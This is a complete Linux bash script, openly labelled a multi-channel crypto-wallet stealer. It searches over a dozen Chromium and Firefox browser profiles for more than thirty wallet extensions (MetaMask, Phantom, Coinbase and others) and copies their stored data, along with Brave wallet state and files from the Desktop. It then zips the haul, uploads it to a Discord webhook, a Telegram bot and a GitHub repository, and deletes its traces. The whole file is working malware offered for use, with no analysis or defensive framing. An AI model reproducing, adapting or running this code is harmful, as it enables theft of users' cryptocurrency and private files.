#!/bin/bash
# ============================================================
# MULTI-C2 WALLET STEALER - Linux Version
# Exfiltrates to: Discord + Telegram + GitHub
# ============================================================

# === CONFIGURATION ===
DEST="/tmp/myfiles"
WDIR="$DEST/mycryptowallet"
DESK="${XDG_DESKTOP_DIR:-$HOME/Desktop}"
MAX=102400

# === THREE C2 ENDPOINTS ===
DISCORD_WEBHOOK="https://discord.com/api/webhooks/XXXXXXXXXXX/YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY"
TELEGRAM_TOKEN="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
TELEGRAM_CHAT_ID="123456789"
GITHUB_TOKEN="ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
GITHUB_REPO="username/repo"
GITHUB_BRANCH="main"

# === CORE FUNCTIONS ===
sn() { echo "$1" | tr ' /(){}@.' '_'; }
scp() { [[ -e "$1" ]] && cp -r "$1" "$2" 2>/dev/null; true; }

# === BROWSER SCANNING ===
blist() {
  local b="$HOME/.config"
  printf '%s\n' \
    "Chrome|$b/google-chrome" \
    "Chrome Beta|$b/google-chrome-beta" \
    "Chrome Dev|$b/google-chrome-unstable" \
    "Brave|$b/BraveSoftware/Brave-Browser" \
    "Edge|$b/microsoft-edge" \
    "Opera|$b/opera" \
    "Vivaldi|$b/vivaldi" \
    "Yandex|$b/yandex-browser" \
    "Thorium|$b/thorium" \
    "Chromium|$b/chromium" \
    "Chrome Flatpak|$HOME/.var/app/com.google.Chrome/config/google-chrome" \
    "Brave Flatpak|$HOME/.var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser" \
    "Edge Flatpak|$HOME/.var/app/com.microsoft.Edge/config/microsoft-edge" \
    "Chromium Flatpak|$HOME/.var/app/org.chromium.Chromium/config/chromium" \
    "Chrome Snap|$HOME/snap/chromium/current/.config/chromium"
}

# === 30+ CRYPTO WALLETS ===
wlist() {
  printf '%s\n' \
    "nkbihfbeogaeaoehlefnkodbefgpgknn|MetaMask" \
    "acmacodkjbdgmoleebolmdjonilkdbch|Rabby Wallet" \
    "odbfpeeihdkbihmopkbjmoonfanlbfcl|MyEtherWallet" \
    "nlbmnnijcnlegkjjpcfjclmcfggfefdm|MEW CX" \
    "opfgelmcmbiajamepnmloijbpoleiama|Rainbow" \
    "kkpllkodjeloidieedojogacfhpaihoh|Enkrypt" \
    "hifafgmccdpekplomjjkcfgodnhcellj|Crypto.com DeFi" \
    "fhbohimaelbohpjbbldcngcnapndodjp|BNB Chain" \
    "cgeeodpfagjceefieflmdfphplkenlfk|ONTO Wallet" \
    "cjelfplplebdjjenllpjcblmjkfcffne|Jaxx Liberty" \
    "hpglfhgfnhbgpjdenjgmdgoeiappafln|Guarda Wallet" \
    "nanjmdknhkinifnkgdcggcfnhdaammmj|Wombat" \
    "gaedmjdfmmahhbjefcbgaolhhanlaolb|HyperPay" \
    "fhilaheimglignddkjgofkcbgekhenbh|Oxalus" \
    "hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase Wallet" \
    "egjidjbpglichdcondbcbdnbeeppgdph|Trust Wallet" \
    "aholpfdialjgjfhomihkjbmgjidlcdno|Exodus" \
    "mcohilncbfahbmgdjkbpemcciiolgcge|OKX Wallet" \
    "mfgccjchihfkkindfppnaooecgfneiii|TokenPocket" \
    "bfnaelmomeimhjnjophhpkkoljpa|Phantom" \
    "bhhhlbepdkbapadjdnnojkbgioiodbic|Solflare" \
    "epapihdplajcdnnkdeiahlgigofloibg|Slope Wallet" \
    "dmkamcknogkgcdfhhbddcghachkejeap|Keplr" \
    "aiifbnbfobpmeekipheeijimdpnlpgpp|Terra Station" \
    "ibnejdfjmmkpcnlpebklmnkoeoihofec|TronLink" \
    "ffnbelfdoeiohenkjibnmadjiehjhajb|Yoroi" \
    "jiidiaalihmmhddjgbnbgdfflelocpak|HashPack" \
    "ejjladinnckdgjemekebdpeokbikhfci|Petra Aptos" \
    "nknhiehlklippafakaeklbeglecifhad|Martian Aptos" \
    "fnnegphlobjdpkhecapkijjdkgcjhkib|Sui Wallet" \
    "opcgpfmipidbgpenhmajoajpbobppdil|Suiet" \
    "cnmamaachppnkjgnildpdmkaakejnhae|Auro Mina" \
    "fnjhmkhhmkbjkkabndcnnogagogbneec|Ronin Wallet"
}

fflist() {
  printf '%s\n' \
    "{d3e7e3df-07b8-4f27-be36-9f4c19cf5ede}|MetaMask" \
    "webextension@metamask.io|MetaMask" \
    "firefox@metamask.io|MetaMask" \
    "{530f7c6c-6077-4703-8f71-cb368c7ba294}|Phantom" \
    "{a4335603-26d8-4bba-b3db-2a7ced9f1c48}|Coinbase Wallet" \
    "{eadbf29f-4603-4234-98f5-efc4985e6c85}|Keplr" \
    "{7e09ce40-b81c-4fe9-a7e3-f8a04dd7cf98}|Ronin Wallet" \
    "ronin@axieinfinity.com|Ronin Wallet" \
    "{d5e44f8f-4d43-4e48-8e0f-85ab4da78fba}|Yoroi"
}

# === DATA STEALING FUNCTIONS ===
desktop() {
  mkdir -p "$DEST"
  while IFS= read -r -d '' f; do
    local n s; n=$(basename "$f"); s=$(stat -c%s "$f" 2>/dev/null || echo 0)
    if [[ $s -le $MAX ]]; then
      cp "$f" "$DEST/$n" 2>/dev/null
    fi
  done < <(find "$DESK" -maxdepth 1 -type f -print0 2>/dev/null)
}

cpw() {
  local bn=$1 pd=$2 id=$3 wn=$4 pn v out ld idb
  pn=$(basename "$pd")
  out="$WDIR/$(sn "$bn")/$(sn "$pn")/$(sn "$wn")"
  mkdir -p "$out"
  v=$(ls -1 "$pd/Extensions/$id" 2>/dev/null | sort -V | tail -1)
  [[ -n "$v" ]] && scp "$pd/Extensions/$id/$v/manifest.json" "$out/manifest.json"
  idb="$pd/IndexedDB/chrome-extension_${id}_0.indexeddb.leveldb"
  [[ -d "$idb" ]] && { mkdir -p "$out/IndexedDB"; scp "$idb/." "$out/IndexedDB/"; }
  ld="$pd/Local Storage/leveldb"
  [[ -d "$ld" ]] && {
    mkdir -p "$out/LS"
    find "$ld" \( -name "*.ldb" -o -name "*.log" \) -exec cp {} "$out/LS/" \; 2>/dev/null || true
  }
  printf "wallet=%s\nbrowser=%s\nprofile=%s\next_id=%s\n" "$wn" "$bn" "$pn" "$id" > "$out/INFO.txt"
}

chromium() {
  while IFS='|' read -r bn bp; do
    [[ -d "$bp" ]] || continue
    while IFS= read -r -d '' pd; do
      [[ -d "$pd/Extensions" ]] || continue
      while IFS='|' read -r id wn; do
        [[ -d "$pd/Extensions/$id" ]] && cpw "$bn" "$pd" "$id" "$wn"
      done < <(wlist)
    done < <(find "$bp" -maxdepth 1 -type d \( -name "Default" -o -name "Profile*" \) -print0 2>/dev/null)
  done < <(blist)
}

firefox_scan() {
  while IFS='|' read -r lbl base; do
    [[ -d "$base" ]] || continue
    while IFS= read -r -d '' pd; do
      local ed="$pd/extensions" pn; [[ -d "$ed" ]] || continue; pn=$(basename "$pd")
      while IFS='|' read -r id wn; do
        local fp=""
        [[ -f "$ed/$id.xpi" ]] && fp="$ed/$id.xpi"
        [[ -d "$ed/$id" ]] && fp="$ed/$id"
        [[ -z "$fp" ]] && continue
        local out="$WDIR/$(sn "$lbl")/$pn/$(sn "$wn")"
        mkdir -p "$out"
        local sd="$pd/browser-extension-data/$id"
        [[ -d "$sd" ]] && { mkdir -p "$out/storage"; scp "$sd/." "$out/storage/"; }
        printf "wallet=%s\next_id=%s\nbrowser=%s\nprofile=%s\n" "$wn" "$id" "$lbl" "$pn" > "$out/INFO.txt"
      done < <(fflist)
    done < <(find "$base" -maxdepth 1 -type d -print0 2>/dev/null)
  done < <(printf '%s\n' \
    "Firefox|$HOME/.mozilla/firefox" \
    "Waterfox|$HOME/.waterfox" \
    "LibreWolf|$HOME/.librewolf" \
    "Firefox_Snap|$HOME/snap/firefox/common/.mozilla/firefox" \
    "Firefox_Flatpak|$HOME/.var/app/org.mozilla.firefox/.mozilla/firefox" \
    "LibreWolf_Flatpak|$HOME/.var/app/io.gitlab.librewolf-community/.librewolf")
}

brave_builtin() {
  local bp="$HOME/.config/BraveSoftware/Brave-Browser"
  [[ -d "$bp" ]] || return 0
  while IFS= read -r -d '' pd; do
    local pf="$pd/Preferences"; [[ -f "$pf" ]] || continue
    grep -q '"brave_wallet"' "$pf" 2>/dev/null || continue
    local pn; pn=$(basename "$pd")
    local out="$WDIR/Brave/$pn/Brave_Builtin"
    mkdir -p "$out"
    scp "$bp/Local State" "$out/LocalState.json"
    printf "wallet=Brave Builtin\nbrowser=Brave\nprofile=%s\n" "$pn" > "$out/INFO.txt"
  done < <(find "$bp" -maxdepth 1 -type d \( -name "Default" -o -name "Profile*" \) -print0 2>/dev/null)
}

# === THREE C2 EXFILTRATION FUNCTIONS ===

exfil_discord() {
  local file=$1
  local boundary=$(uuidgen 2>/dev/null | tr -d '-' || date +%s%N)
  {
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\nContent-Type: application/zip\r\n\r\n" "$boundary" "$(basename "$file")"
    cat "$file"
    printf "\r\n--%s--\r\n" "$boundary"
  } | curl -s -X POST -H "Content-Type: multipart/form-data; boundary=$boundary" --data-binary @- "$DISCORD_WEBHOOK" >/dev/null 2>&1
  return $?
}

exfil_telegram() {
  local file=$1
  curl -s -F "chat_id=$TELEGRAM_CHAT_ID" -F "document=@$file" \
    "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument" >/dev/null 2>&1
  return $?
}

exfil_github() {
  local file=$1
  local filename="stolen_data_$(date +%Y%m%d_%H%M%S).zip"
  local base64=$(base64 -w0 "$file" 2>/dev/null)
  curl -s -X PUT \
    -H "Authorization: token $GITHUB_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"message\":\"Update stolen data\",\"content\":\"$base64\",\"branch\":\"$GITHUB_BRANCH\"}" \
    "https://api.github.com/repos/$GITHUB_REPO/contents/$filename" >/dev/null 2>&1
  return $?
}

exfil_all() {
  local file=$1
  local success=0
  
  echo "📤 Exfiltrating to THREE C2 channels..."
  
  # Discord
  echo -n "  → Discord... "
  if exfil_discord "$file"; then
    echo "✅"
    ((success++))
  else
    echo "❌"
  fi
  
  # Telegram
  echo -n "  → Telegram... "
  if exfil_telegram "$file"; then
    echo "✅"
    ((success++))
  else
    echo "❌"
  fi
  
  # GitHub
  echo -n "  → GitHub... "
  if exfil_github "$file"; then
    echo "✅"
    ((success++))
  else
    echo "❌"
  fi
  
  echo "📊 Exfiltrated to $success/3 channels"
}

# === CREATE ARCHIVE ===
create_archive() {
  local src=$1 dst=$2
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$src" "$dst" << 'PYEOF'
import sys, os, zipfile, glob
src, dst = sys.argv[1], sys.argv[2]
with zipfile.ZipFile(dst, 'w', zipfile.ZIP_DEFLATED) as zf:
    for root, dirs, files in os.walk(src):
        for name in files:
            fp = os.path.join(root, name)
            zf.write(fp, os.path.relpath(fp, src))
PYEOF
    return $?
  else
    zip -r "$dst" "$src" 2>/dev/null
    return $?
  fi
}

# === MAIN EXECUTION ===
[[ "$(uname)" == "Linux" ]] || exit 1

echo "🔍 Scanning for cryptocurrency wallets..."
mkdir -p "$DEST" "$WDIR"

# Steal data
desktop
chromium
firefox_scan
brave_builtin

# Create archive
ZIP_OUT="/tmp/myfiles.zip"
create_archive "$DEST" "$ZIP_OUT"

# Exfiltrate to THREE C2s
if [[ -f "$ZIP_OUT" ]]; then
  exfil_all "$ZIP_OUT"
fi

# Cleanup
rm -rf "$DEST" "$ZIP_OUT" 2>/dev/null

echo "✅ Done."